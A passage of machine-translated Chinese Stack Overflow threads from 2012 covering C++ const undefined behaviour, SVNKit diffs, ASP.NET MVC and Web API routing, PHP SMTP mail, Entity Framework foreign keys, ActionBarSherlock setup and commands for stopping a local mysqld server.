在这种情况下，我会说这是未定义的行为。`bc`是一个`const`对象，它的所有子对象（少`mutable`s）¹也是一个对象，因此也`bc.v`应该是，并且修改一个`const`对象，无论如何实现，都是 UB ²。

[1] C++03 3.9.3/3：

> const 限定的类对象的每个非静态、非可变、非引用数据成员都是 const 限定的...

[2] C++03 7.1.5.1/4：

> 除了可以修改任何声明为 mutable (7.1.1) 的类成员外，任何在 const 对象的生命周期 (3.8) 期间修改它的尝试都会导致未定义的行为。

**编辑**回应问题的编辑：不，代码的修改版本不会导致未定义的行为。这可能是不好的做法，但实际上有时可能很有用。你可以例如。使用它通过 const-iterators (DRY) 实现类的迭代器：

```
class const_iterator
{
public:
  const T& dereference() const; // complicated
};

class iterator : public const_iterator
{
public:
  T& dereference() const { return const_cast<T&>(const_iterator::dereference()); }
}; 
```

当然，这依赖于`iterator`s 只能由可变容器制成，const 和非 const 版本没有区别（没有 COW 等）等事实，但这是相当普遍的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-18T21:37:18.227

在您的特定情况下，它是未定义的行为，因为对象**是**const，而不仅仅是引用。在以下情况下，这将是*不好的做法*（并且危险地接近未定义的行为）：

```
void f( const BreakConst& b ) {
   bc.break_stuff();
}
int main() {
   BreakConst b;
   f( b );
} 
```

不同之处在于，在这种情况下，实际对象不是 const，即使级别的引用`f`是。危险地接近未定义的行为来自这样一个事实，即丢弃 const-ness 的成员函数不可能知道调用它的对象是否为 const，因此您失去了所有控制权。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-18T21:45:43.283

### *编辑后*：

**不**，它不是未定义的。您可以通过 const 引用修改可变对象；这是完全允许和合法的。

* * *

### *在*您编辑之前：

是的，它必须是未定义的，因为标准（我在[这里查看草稿](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2011/n3242.pdf#page=164)）清楚地表明：

> ### §7.1.6.1.4
> 
> `mutable`除了可以修改声明的任何类成员（第 77.1.1 节）外，任何在`const`对象生命周期内（第 3.8 节）修改对象的尝试都会导致未定义的行为。

所以是的——因为成员不是可变的，修改它显然是未定义的行为。

我不知道*为什么*规则是这样的，这是否是故意的，是否确实是一个漏洞，是否也违反了另一个规则，你应该怎么看它，等等......但是关于是否是UB的问题：是的，根据标准它是未定义的。

# diff - 使用 SVNKit 无法获得 BASE 和 WORKING 之间的差异

> ID：11091386
> 
> 赞同：0
> 
> 时间：2012-06-18T21:30:48.450
> 
> 标签：diff, svnkit

我想使用 SVNDiffClient 来获取 wc 本地更改，相当于“svn diff -rBASE”，这正是[本](http://wiki.svnkit.com/Diffing%20a%20working%20copy%20against%20a%20base%20revision)示例应该做的。

但是，运行示例中的代码会抛出“org.tmatesoft.svn.core.SVNException: svn: 至少一个修订版必须是非本地的，以用于挂钩差异”，这正是[文档](http://svnkit.com/javadoc/org/tmatesoft/svn/core/wc/SVNDiffClient.html#doDiff%28java.io.File,%20org.tmatesoft.svn.core.wc.SVNRevision,%20org.tmatesoft.svn.core.wc.SVNRevision,%20org.tmatesoft.svn.core.wc.SVNRevision,%20org.tmatesoft.svn.core.SVNDepth,%20boolean,%20java.io.OutputStream,%20java.util.Collection%29)所说的。

我希望能够在不访问服务器的情况下将 WORKING 与 BASE 进行比较，看看是否有任何变化。这可以使用 SVNKit 完成吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:16:51.710

您可以使用新的 API：

```
 final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

    final SvnDiff diff = svnOperationFactory.createDiff();
    diff.setSources(SvnTarget.fromFile(workingCopyDirectory, SVNRevision.BASE), SvnTarget.fromFile(workingCopyDirectory, SVNRevision.WORKING));
    diff.setOutput(byteArrayOutputStream);
    diff.run(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-19T14:57:14.070

您也可以使用旧 API：

```
final SVNClientManager clientManager = SVNClientManager.newInstance();
try {
    final SVNDiffClient diffClient = clientManager.getDiffClient();

    final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
    diffClient.doDiff(workingCopyDirectory, SVNRevision.BASE, workingCopyDirectory, SVNRevision.WORKING, SVNDepth.INFINITY, false, outputStream, null);

    System.out.println(outputStream);
} finally {
    clientManager.dispose();
} 
```

# asp.net-mvc - asp.net mvc - 对同一操作使用多个 URL

> ID：11091388
> 
> 赞同：0
> 
> 时间：2012-06-18T21:30:56.537
> 
> 标签：asp.net-mvc, asp.net-mvc-routing

我有一个控制器调用`TaskListsController`一个名为`Edit`.

该`Edit`操作接受一个可为空的 int 参数。如果它接收到 null，它会添加一个`TaskList`. 如果它接收到一个 int，它会编辑`TaskList`具有相同 ID 的 。每种情况下的逻辑几乎相同。

我想以这样一种方式配置我的路由，即 URL 'TaskLists/Add' 映射到`Edit`以 null 作为参数的操作，而 URL 'TaskLists/Edit/{id}' 映射到`Edit`并将 ID 传递给它网址。

从在浏览器中输入 URL 并将它们正确路由到操作的角度来看，我可以让它工作，但它失败的地方是系统从`Html.ActionLink`.

我正在使用以下方法生成“添加”链接：

```
Html.ActionLink("Add task list", "Edit", "TaskLists") 
```

我正在使用以下方法生成“编辑”链接：

```
Html.ActionLink(taskList.Name, "Edit", new { Id = taskList.Id }) 
```

..where`taskList`是`TaskList`类的一个实例。

如果我使用此路由：

```
routes.MapRoute(
                "TaskLists/Add", // Route name
                "TaskLists/Add", // URL with parameters
                new { controller = "TaskLists", action = "Edit" });

            routes.MapRoute(
                "TaskLists/Edit/{id}", // Route name
                "TaskLists/Edit/{id}", // URL with parameters
                new { controller = "TaskLists", action = "Edit", id = UrlParameter.Optional }); 
```

...“添加”链接已正确生成（“TaskLists/Add”），但“编辑”链接出现“TaskLists/Add?Id=1”。

如果我把路由命令反过来：

```
routes.MapRoute(
                "TaskLists/Edit/{id}", // Route name
                "TaskLists/Edit/{id}", // URL with parameters
                new { controller = "TaskLists", action = "Edit", id = UrlParameter.Optional });

            routes.MapRoute(
                "TaskLists/Add", // Route name
                "TaskLists/Add", // URL with parameters
                new { controller = "TaskLists", action = "Edit" }); 
```

...然后正确生成“编辑”链接（“任务列表/编辑/x”），但“添加”链接出现“任务列表/编辑”。

有什么办法可以让我吃蛋糕吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-19T01:12:45.757

`Html.RouteLink("linkText", "routeName")`使用命名路由（这也意味着您每次都能毫无顾虑地走上正确的路线。

相应地更新`Name`路线上的参数，然后将以下内容添加到您的视图中：

`Html.RouteLink("Add task list", "NewTaskList")`

和

`Html.RouteLink(taskList.Name, "EditTaskList", new { Id = taskList.Id })`

# c# - Asp.net mvc3 C#，trace 500错误响应信息？

> ID：11091394
> 
> 赞同：1
> 
> 时间：2012-06-18T21:31:23.487
> 
> 标签：c#, asp.net, httpwebresponse

我需要从 HttpWebResponse 获取 500 错误响应消息。

```
HttpWebResponse objResponse = (HttpWebResponse)objRequest.GetResponse();
using (StreamReader responseStream = new StreamReader(objResponse.GetResponseStream()))
{
      post_response = responseStream.ReadToEnd();
      responseStream.Close();
} 
```

![在此处输入图像描述](../Images/99984aa4dfac54a256391dca92856b63.png)

谢谢！

[编辑]

使用浏览器打开此网址，

[https://www.sagepayments.net/web_services/vterm_extensions/transaction_processing.asmx/BANKCARD_PRIOR_AUTH_SALE](https://www.sagepayments.net/web_services/vterm_extensions/transaction_processing.asmx/BANKCARD_PRIOR_AUTH_SALE)

浏览器将打印响应消息“缺少参数：M_ID”。

现在，我想使用 asp.net 获取该响应消息

```
var post_string = "hello=hi";

HttpWebRequest objRequest = (HttpWebRequest)WebRequest.Create("https://www.sagepayments.net/web_services/vterm_extensions/transaction_processing.asmx/BANKCARD_PRIOR_AUTH_SALE");
    objRequest.Method = "POST";
    objRequest.ContentLength = post_string.Length;
    objRequest.ContentType = "application/x-www-form-urlencoded";

    // post data is sent as a stream
    StreamWriter myWriter = null;
    myWriter = new StreamWriter(objRequest.GetRequestStream());
    myWriter.Write(post_string);
    myWriter.Close();

    // returned values are returned as a stream, then read into a string

    try
    {
    HttpWebResponse objResponse = (HttpWebResponse)objRequest.GetResponse();
    using (StreamReader responseStream = new StreamReader(objResponse.GetResponseStream()))
    {
        post_response = responseStream.ReadToEnd();
        responseStream.Close();
    }

    Response.Write(post_response);
    }
    catch(WebException e)
    {   
    Response.Write("Error : "+e.Message); 
    Response.Write("<br /> Data : " + e.Data);
    Response.Write("<br /> HelpLink : " + e.HelpLink);
    Response.Write("<br /> InnerException : " + e.InnerException);
    Response.Write("<br /> Response : " + e.Response);
    Response.Write("<br /> Source : " + e.Source);
    Response.Write("<br /> Status : " + e.Status);
    Response.Write("<br /> TargetSite : " + e.TargetSite);
    }

Result : 
Error : The remote server returned an error: (500) Internal Server Error.
Data : System.Collections.ListDictionaryInternal
HelpLink :
InnerException :
Response : System.Net.HttpWebResponse
Source : System
Status : ProtocolError
TargetSite : System.Net.WebResponse GetResponse() 
```

如何获取此消息？

**缺少参数：M_ID。**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T22:10:27.000

如果在 Web 请求期间引发异常，我认为您需要检查 Web 响应的 StatusCode 和 StatusDescription 属性。

例如：

```
try
{
    HttpWebResponse objResponse = (HttpWebResponse)objRequest.GetResponse();
    using (StreamReader responseStream = new StreamReader(objResponse.GetResponseStream()))
    {
        post_response = responseStream.ReadToEnd();
        responseStream.Close();
    }
}
catch(WebException wex)
{
    // This is the line that gets you the response object
    HttpWebResponse response = (HttpWebResponse)wex.Response;

    if(response != null)
    {
        // You can now read the response StatusCode and StatusDescription
        HttpStatusCode responseCode = response.StatusCode;
        String statusDescription = response.StatusDescription;

        // Add your status checking logic here
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:51:43.790

除非您打开了自定义错误，否则 HTTP 错误将在 IIS 级别处理。查看这篇文章，了解如何更改您的 Web 配置以添加您自己的自定义错误页面：[返回 404 错误 ASP.NET MVC 3](https://stackoverflow.com/q/5635114/590783)

这个问题： [How to send a Status Code 500 in ASP.Net and still write to the response？](https://stackoverflow.com/q/4495961/590783)

...还特别介绍了如何抛出 500 以及如何处理客户错误。它还包括一些关于`Context.Response.TrySkipIisCustomErrors`哪个是公认的答案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-08-28T15:08:36.777

这就是我的情况。希望它会帮助你。

```
try
{
    response = (HttpWebResponse)request.GetResponse();
    using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
    {
        responseMessage = streamReader.ReadToEnd();
        Assert.IsTrue(response.StatusCode == HttpStatusCode.OK);
        response.Close();
    }
}
catch(WebException ex)
{
    using (StreamReader streamReader = new StreamReader(ex.Response.GetResponseStream()))
    {
        responseMessage = streamReader.ReadToEnd();
        File.WriteAllText(@"C:\Users\Paul\Documents\text.txt", responseMessage);
    }
} 
```

# email - smtp邮件发送错误php

> ID：11091397
> 
> 赞同：0
> 
> 时间：2012-06-18T21:31:44.727
> 
> 标签：email, php

我尝试从我的本地主机（wamp）通过 smtp 服务器（gmail）发送邮件。运行程序时，它将显示**致命错误：超过 30 秒的最大执行时间**。我更改了超时增益，它会产生相同的错误

```
<?php
$to = "email@gmail.com";
$nameto = "Who To";
$from = "from@fast2host.com";
$namefrom = "Who From";
$subject = "Hello World Again!";
$message = "World, Hello!";
authSendEmail($from, $namefrom, $to, $nameto, $subject, $message);

function authSendEmail($from, $namefrom, $to, $nameto, $subject, $message)
{
//SMTP + SERVER DETAILS
/* * * * CONFIGURATION START * * * */
$smtpServer = "smtp.gmail.com";
$port = "25";
$timeout = "30";
$username = "username";
$password = "password";
$localhost = "27.107.106.163";
$newLine = "\r\n";
/* * * * CONFIGURATION END * * * * */

//Connect to the host on the specified port
$smtpConnect = fsockopen($smtpServer, $port, $errno, $errstr, $timeout);
$smtpResponse = fgets($smtpConnect, 515);
if(empty($smtpConnect))
{
$output = "Failed to connect: $smtpResponse";
return $output;
}
else
{
$logArray['connection'] = "Connected: $smtpResponse";
}

//Request Auth Login
fputs($smtpConnect,"AUTH LOGIN" . $newLine);
$smtpResponse = fgets($smtpConnect, 515);
$logArray['authrequest'] = "$smtpResponse";

//Send username
fputs($smtpConnect, base64_encode($username) . $newLine);
$smtpResponse = fgets($smtpConnect, 515);
$logArray['authusername'] = "$smtpResponse";

//Send password
fputs($smtpConnect, base64_encode($password) . $newLine);
$smtpResponse = fgets($smtpConnect, 515);
$logArray['authpassword'] = "$smtpResponse";

//Say Hello to SMTP
fputs($smtpConnect, "HELO $localhost" . $newLine);
$smtpResponse = fgets($smtpConnect, 515);
$logArray['heloresponse'] = "$smtpResponse";

//Email From
fputs($smtpConnect, "MAIL FROM: $from" . $newLine);
$smtpResponse = fgets($smtpConnect, 515);
$logArray['mailfromresponse'] = "$smtpResponse";

//Email To
fputs($smtpConnect, "RCPT TO: $to" . $newLine);
$smtpResponse = fgets($smtpConnect, 515);
$logArray['mailtoresponse'] = "$smtpResponse";

//The Email
fputs($smtpConnect, "DATA" . $newLine);
$smtpResponse = fgets($smtpConnect, 515);
$logArray['data1response'] = "$smtpResponse";

//Construct Headers
$headers = "MIME-Version: 1.0" . $newLine;
$headers .= "Content-type: text/html; charset=iso-8859-1" . $newLine;
$headers .= "To: $nameto <$to>" . $newLine;
$headers .= "From: $namefrom <$from>" . $newLine;

fputs($smtpConnect, "To: $to\nFrom: $from\nSubject: $subject\n$headers\n\n$message        \n.\n");
$smtpResponse = fgets($smtpConnect, 515);
$logArray['data2response'] = "$smtpResponse";

// Say Bye to SMTP
fputs($smtpConnect,"QUIT" . $newLine);
$smtpResponse = fgets($smtpConnect, 515);
$logArray['quitresponse'] = "$smtpResponse";
}
?> 
```

请帮助我调试错误的任何人

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-23T03:35:59.980

你有太多多余的代码，这是你应该做的：

```
<?php
    require_once 'Mail.php';
    require_once 'Mail/mime.php';
    // set all of the parameters
    $to = "Who To <email@gmail.com>";
    $from = "Who From <from@fast2host.com>";
    $subject = "Hello World Again!";
    $message = "World, Hello!";

    $text = strip_tags($message);

    // create the headers
    $headers = array(
        'Subject' => $subject,
        'From' => $from,
        'To' => $to,
        'MIME-Version' => '1.0',
        'Date' => date('r'),
        'Message-ID' => '<'.sha1(microtime(true)).'@mydomain.com>',
        'Content-Type' => 'text/html',
        'Content-Transfer-Encoding' => 'quoted-printable',
    ); // end $headers

    // create the message
    $mime = new Mail_mime("\n");
    $mime->setTXTBody($text);
    $mime->setHTMLBody($message);

    // always call these methods in this order
    $body = $mime->get();
    $headers = $mime->headers($headers);

    // create the smtp mail object
    $smtp_params = array(
        'host' => 'smtp.gmail.com',
        'auth' => true,
        'username' => 'myUserName',
        'password' => 'myPassWord',
    ); // end $smtp_params
    $smtp = Mail::factory('smtp', $smtp_params);

    // send the message

    $recipients = array($to);
    $mail = $smtp->send($recipients, $headers, $body);

?> 
```

PS。'auth'=> true; 在 ssl 连接的 smtp_params 数组标志中。

# xml - 获取 REST 调用没有返回我在 url 中输入的字符串

> ID：11091403
> 
> 赞同：0
> 
> 时间：2012-06-18T21:32:17.153
> 
> 标签：xml, asp.net-mvc, api, rest, get

我有非常简单的代码：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Web.Http;

namespace Calculator.Controllers
{
    public class CalcController : ApiController
    {

        public string Get(string type)
        {

            return type;
        }

    }
} 
```

这就是我输入[http://www.example.com/api/calc/test时返回的内容](http://www.example.com/api/calc/test)

```
<string xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.microsoft.com/2003/10/Serialization/" i:nil="true"/> 
```

当我使用[http://www.example.com/api/calc/?type=test](http://www.example.com/api/calc/?type=test)它返回这个：

```
<string xmlns="http://schemas.microsoft.com/2003/10/Serialization/">test</string> 
```

我如何做到这一点，这样我就可以只做顶部的而不是底部的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T03:11:29.503

您必须在`Global.asax.cs`默认路由之上创建一个路由。

```
routes.MapHttpRoute(
    name: "route1",
    routeTemplate: "api/calc/{type}",
    defaults: new { controller = "Calc" }
); 
```

# c# - 使用实体框架更新外键

> ID：11091407
> 
> 赞同：2
> 
> 时间：2012-06-18T21:32:32.163
> 
> 标签：c#, entity-framework

我又遇到了实体框架的问题。

我正在尝试使用外键更新表，

我在插入时遇到问题，但通过编辑 edmx 文件进行了排序。

我正在使用以下代码更新与角色表有外部关系的用户表，

```
Domain.Data.Role role = db.Role.FirstOrDefault(r => r.RoleName == user.Role); 

Domain.Data.User data = db.User.Where(u => u.UserName == username).First();

data.Pass = user.Password.Encrypt();
data.CreatedBy = Login.User.Encrypt();
data.DtCreated = DateTime.Now;

//data.Role = role;

 data.Role = (from r in db.Role
              where r.RoleName == user.Role
              select r).First();

 db.SaveChanges(); 
```

在更新我得到以下异常，

**发生参照完整性约束冲突：当对象具有非临时键时，不能更改作为参照完整性约束一部分的属性。**

任何反馈都会非常有帮助。

问候，

萨布

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T01:31:18.620

我不确定，但您可能想检查在设计器中创建/更新模型时是否勾选了“在模型中包含外键列”。如果你勾选了，你可能会发现设置对象是不够的，你可能还需要设置 ID 或只设置 ID。

例如。你可能需要做：

```
data.RoleId = role.RoleId; 
```

结合设置对象或代替设置对象。

就个人而言，我没有勾选“在模型中包含外键列”，因为它给我带来了各种各样的头痛，我不记得与一年或更早之前的情况完全一样。有时这很痛苦，因为能够使用 ID 进行过滤/搜索/更新是件好事，但我已经学会在没有 ID 的情况下生活，以避免像您遇到的烦恼。

# system-verilog - SystemVerilog case 语句不起作用

> ID：11091409
> 
> 赞同：0
> 
> 时间：2012-06-18T21:33:00.320
> 
> 标签：system-verilog

任何人都知道为什么这个案例陈述不起作用：

```
int width;
width = 8;
case (width === 16)
  1'b0: begin
    // correct code
  end
  1'b1: begin
    // we end up here
  end
endcase 
```

我正在使用 VCS。我尝试使用 DVE 调试器运行它，并且在使用调试器运行时代码可以正常工作。此外，此代码嵌套在另一个 case 语句中，此处未显示。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-19T04:23:45.357

我不能直接回答你的问题，但我认为 synopsys 不会犯那个愚蠢的错误。如果他们这样做了，请告诉我。

在某些语言中，返回值 '0' 表示 true，我不确定这里是否相同。

但是为了避免这个问题，我认为可以将代码更改为其他方式：

单程：

```
case (width)
  16 : begin
  // correct code
  end
  default : begin
  // Other code
  end
endcase 
```

或者：

```
if (width === 16) begin
    // correct code
end 
```

# c++ - “无法实例化抽象类”多重继承和第 3 方接口

> ID：11091411
> 
> 赞同：0
> 
> 时间：2012-06-18T21:33:11.700
> 
> 标签：c++

我有一个具有以下类继承的现有项目

```
class Base
{
public:
    Base();
    virtual ~Base();    
    void    SetID(unsigned short);
    virtual inline unsigned short GetID();
    protected:      
    unsigned short  id;
};

class Generic : public Base {
public:
        Generic(const char  *in_name);
        const   char* GetName()                 { return name; }

    protected:  
        char    name[30];
};

class Actor : public Generic
{
public:     
    Actor(const char    *in_name);
    ~Actor();   
    void DoSomething(const char* str);   
}; 
```

现在我创建了一个单独的项目，如果我想提供一个必须实现的接口才能使用该功能 - 我计划将该项目重用于其他实现。

```
class MyInterface
{
    public:     
        virtual ~MyInterface() {} 

        // Our methods that need to implemented
        virtual const char* GetName() = 0;      
        virtual void DoSomething(const char* str) = 0;
        virtual unsigned short GetID() = 0;
}; 
```

现在我只是想将它与我的演员类一起使用，例如演员类：public Generic，public MyInterface

但是它无法编译

```
'const char *MyInterface::GetName(void)' : is abstract see declaration of     'MyInterface::GetName'
'unsigned short MyInterface::GetID(void)' : is abstract see declaration of 'MyInterface::GetID'
error C2385: ambiguous access of 'GetName'
could be the 'GetName' in base 'Generic'
or could be the 'GetName' in base 'MyInterface' 
```

问题可能是 GetName 已经在 Generic 中实现，而 GetID 已经在 Base 中实现 - 所以在子类 Actor 中实现接口是不可能的，因为编译器不够聪明，无法意识到已经有这些方法的实现。

但是，我找到了一种解决方法-但是为此，我必须扩展actor类的标头，这不是一件好事-我想知道是否有另一种方法-我的解决方法是

```
class Actor : public Generic, public MyInterface
{
public:     
    Actor(const char    *in_name);
    ~Actor();   
    void DoSomething(const char* str);   
    const char* GetName() { return Generic::GetName(); };
    inline unsigned short GetID() { return Base::GetID(); };
}; 
```

现在这显然不适用于可变参数方法，我必须实现现有方法并再次委托给父级 - 有更好的解决方案吗？

**编辑**为了澄清 - 类基础，通用和演员存在于其他人管理的另一个项目中，对这些的修改应该非常有限。- 我创建了一个单独的项目，它创建了一个静态 LIB - 将这些函数与演员类结合使用 - 我创建了一个接口，在我自己的项目中没有任何依赖关系，并为其他项目提供了一个可重用的库，这只是需要实现这个接口。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T01:12:32.863

```
class Base
{
protected:      
    unsigned short  id;
public:
    void SetID(unsigned short);
    virtual inline unsigned short GetID() { return id; }
    virtual ~Base() {}
    Base(): id() {}
};

class Generic 
    : public Base
{
protected:  
    char    name[30];
public:
    const char* GetName() { return name; }
    Generic(const char* in_name): name() {}
};

class Actor
    : public Generic
{
public:     
    void DoSomething(const char* str) {}

    ~Actor() {}
    Actor(const char* in_name)
        : Generic( name )
    {}
};

class MyInterface
{
public:     
    // Our methods that need to implemented
    virtual const char* name() const = 0;      
    virtual int id() const = 0;
    virtual void doSomething( const char* str ) = 0;

    virtual ~MyInterface() {} 
};

template< class TpBase >
class MyInterfaceOn
    : public virtual MyInterface
    , public TpBase
{
public:
    typedef TpBase Base;

private:
    MyInterfaceOn& mutableSelf() const
    { return *const_cast<MyInterfaceOn*>( this ); }

public:
    const char* name() const { return mutableSelf().Base::GetName(); }
    int id() const { return mutableSelf().Base::GetID(); }
    void doSomething(const char* str) { Base::DoSomething( str ); }

    MyInterfaceOn( char const name[] )
        : Base( name )
    {}
};

class MyActor
    : public MyInterfaceOn< Actor >
{
public:
    MyActor( char const name[] )
        : MyInterfaceOn< Actor >( name )
    {}
};

int main()
{
    MyInterface const&  actor   = MyActor( "NN" );
} 
```

# android - ActionBarSherlock 初学者设置错误

> ID：11091413
> 
> 赞同：3
> 
> 时间：2012-06-18T21:33:15.473
> 
> 标签：android, eclipse, actionbarsherlock

我第一次尝试在 Windows 7 上使用 Eclipse 设置 ActionBarShelock。

我按照以下说明操作： http: [//actionbarsherlock.com/usage.html](http://actionbarsherlock.com/usage.html)

ActionBarSherlock project.properties:

```
 android.library=true
    # Project target.
    target=android-15 
```

ActionBarSherlock AndroidManifest.xml：

```
<uses-sdk android:minSdkVersion="7" android:targetSdkVersion="11"/> 
```

我在 Lint 中的错误：`Call requires API level 11 (current min is 7): android.widget...`

或者，如果我忽略 ActionBarSherlock 上的错误并将其作为库导入，那么我将无法编译我的项目，因为无法识别对库的任何引用并且我没有收到任何资源错误。

我查了很多有类似问题的人，它总是一个 API 构建目标错误。谢谢你的建议！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T22:19:46.667

一些东西：

1.  确保您使用 Android 4.0 或更高版本 (API 14+)编译**您的应用程序。**除了库之外，您还必须这样做。
2.  确保您正在调用`getSupportActionBar`而不是`getActionBar`. 这可能是您的 lint 错误的来源。
3.  虽然以 API 11 为目标是有效的，但通过以 14 或更高为目标可以获得很多东西。如果可以，请尝试这样做。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-18T22:53:24.250

我找到了！JDK 合规级别设置为 1.5。将其设置为 1.6 后，它起作用了。

它在 Action Bar Sherlock 网站的要求部分中说明了这一点，但我错误地假设 Eclipse 使用的是最新的 JDK 设置。

绝对的初学者错误。

感谢您的帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-18T21:38:29.113

您使用的是旧版本的 ActionBarSherlock 吗？作为当前版本，4.1.0 将 targetSdk 设置为 15。

我认为某些较旧的版本可能会出现与较新的 ADT/lint 或类似的问题。

# mysql - 如何停止mysqld

> ID：11091414
> 
> 赞同：203
> 
> 时间：2012-06-18T21:33:17.673
> 
> 标签：mysql, macos

要找出 mysqld 的启动命令（使用 mac），我可以这样做：

```
ps aux|grep mysql 
```

我得到以下输出，它允许我启动 mysql 服务器。

```
/usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=... 
```

我如何找到从命令行停止 mysql 的必要命令？

* * *

## 回答 #1

> 赞同：339
> 
> 时间：2012-06-18T21:36:57.033

尝试：

```
/usr/local/mysql/bin/mysqladmin -u root -p shutdown 
```

或者：

```
sudo mysqld stop 
```

或者：

```
sudo /usr/local/mysql/bin/mysqld stop 
```

或者：

```
sudo mysql.server stop 
```

如果您**在 OSX 中安装 Launchctl，**您可以尝试：

## MacPorts

```
sudo launchctl unload -w /Library/LaunchDaemons/org.macports.mysql.plist
sudo launchctl load -w /Library/LaunchDaemons/org.macports.mysql.plist 
```

注意：这在重新启动后是持久的。

## 家酿

```
launchctl unload -w ~/Library/LaunchAgents/homebrew.mxcl.mysql.plist
launchctl load -w ~/Library/LaunchAgents/homebrew.mxcl.mysql.plist 
```

## 二进制安装程序

```
sudo /Library/StartupItems/MySQLCOM/MySQLCOM stop
sudo /Library/StartupItems/MySQLCOM/MySQLCOM start
sudo /Library/StartupItems/MySQLCOM/MySQLCOM restart 
```

我发现在：[https ://stackoverflow.com/a/102094/58768](https://stackoverflow.com/a/102094/58768)

* * *

## 回答 #2

> 赞同：38
> 
> 时间：2013-01-10T00:25:33.423

有另一种方法可以通过调用来杀死守护进程

```
kill -TERM PID 
```

其中`PID`是存储在文件中的值`mysqld.pid`或可以通过发出命令获得的 mysqld 进程 ID `ps -a | grep mysqld`。

* * *

## 回答 #3

> 赞同：24
> 
> 时间：2017-07-31T08:14:19.240

我用下一个命令做到了：

```
sudo killall mysqld 
```

* * *

## 回答 #4

> 赞同：20
> 
> 时间：2014-12-31T05:54:35.173

[我在这里找到了答案。](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=0CCUQFjAB&url=http%3A%2F%2Fstackoverflow.com%2Fquestions%2F14161415%2Fmysql-process-cannot-be-stopped&ei=FY-jVL7lCYW7ogSW4YGYDQ&usg=AFQjCNHiQOFyHXl0uiCYxwNeYfj-ZRsHNg&sig2=lCsaaeNIJyEmVQizzWv-4A)

利用

```
sudo stop mysql 
```

* * *

## 回答 #5

> 赞同：20
> 
> 时间：2015-12-21T09:27:12.800

对于 Windows，如果路径中有 mysql/bin，则可以直接运行此命令。

```
mysqladmin -u root -p shutdown 
```

* * *

## 回答 #6

> 赞同：17
> 
> 时间：2018-08-16T13:00:16.540

# 在 Mac 上为我工作

### a) 停止进程

```
sudo launchctl list | grep -i mysql 
```

**如果结果显示类似：** “xxx.xxx.mysqlxxx”

```
sudo launchctl remove xxx.xxx.mysqlxxx 
```

> 例子： `sudo launchctl remove org.macports.mysql56-server`

### b) 禁用自动启动进程

```
sudo launchctl unload -wF /Library/LaunchDaemons/xxx.xxx.mysqlxxx.plist 
```

> 例子： `sudo launchctl unload -wF /Library/LaunchDaemons/org.macports.mysql56-server.plist`

*   最后重启你的mac

注意：在某些情况下，如果您先尝试**“a)”**，则需要在尝试**b)**之前再次重新启动。

* * *

## 回答 #7

> 赞同：13
> 
> 时间：2016-06-23T14:15:23.023

在 OSX 10.8 及更高版本上，可以从系统配置中获得对 MySQL 的控制。打开系统偏好设置，单击 Mysql（通常在最底部）并从该窗格启动/停止服务。 [https://dev.mysql.com/doc/refman/5.6/en/osx-installation-launchd.html](https://dev.mysql.com/doc/refman/5.6/en/osx-installation-launchd.html)

plist 文件现在位于 /Library/LaunchDaemons/com.oracle.oss.mysql.mysqld.plist 下

* * *

## 回答 #8

> 赞同：10
> 
> 时间：2012-08-04T12:42:10.113

对于二进制安装程序，请使用：

停止：

```
sudo /Library/StartupItems/MySQLCOM/MySQLCOM stop 
```

开始：

```
sudo /Library/StartupItems/MySQLCOM/MySQLCOM start 
```

重新启动：

```
sudo /Library/StartupItems/MySQLCOM/MySQLCOM restart 
```

* * *

## 回答 #9

> 赞同：7
> 
> 时间：2020-11-13T12:38:45.897

当使用 Homebrew 安装 mysql 时，它会在被杀死时自动重新启动。您需要使用以下命令：

```
brew services stop mysql 
```

**PS**：如果您安装了特定版本，它将是`mysql@X.X`

* * *

## 回答 #10

> 赞同：6
> 
> 时间：2014-12-18T08:45:48.507

杀戮绝对是错误的方式！PID 将保留，Replicationsjobs 将被杀死等等。

**停止 MySQL 服务器**

> /sbin/service mysql 停止

**启动 MySQL 服务器**

> /sbin/service mysql 启动

**重启 MySQL 服务器**

> /sbin/service mysql重启

如果您没有足够的权限，可能需要 sudo

* * *

## 回答 #11

> 赞同：5
> 
> 时间：2019-06-01T14:11:14.083

尝试连续四次杀死mysqld。这是唯一对我有用的东西......

```
root@ubuntu:/etc/init# killall -KILL mysqld 
root@ubuntu:/etc/init# killall -KILL mysqld 
root@ubuntu:/etc/init# killall -KILL mysqld 
root@ubuntu:/etc/init# killall -KILL mysqld 
mysqld: no process found 
```

一遍又一遍地杀死它，直到你看到“mysqld：找不到进程”。

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2014-01-05T22:12:30.430

在 CentOS 6.4 上对我有用的是`service mysqld stop`作为 root 用户运行。

我在[nixCraft](http://www.cyberciti.biz/faq/mysql-startup-script-under-bsdlinux/)上找到了答案。

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2016-05-13T04:12:08.350

```
/etc/init.d/mysql stop
service mysql stop
killall -KILL mysql mysqld_safe mysqld

When you see the following information, you success

mysql: no process found
mysqld_safe: no process found
mysqld: no process found 
```

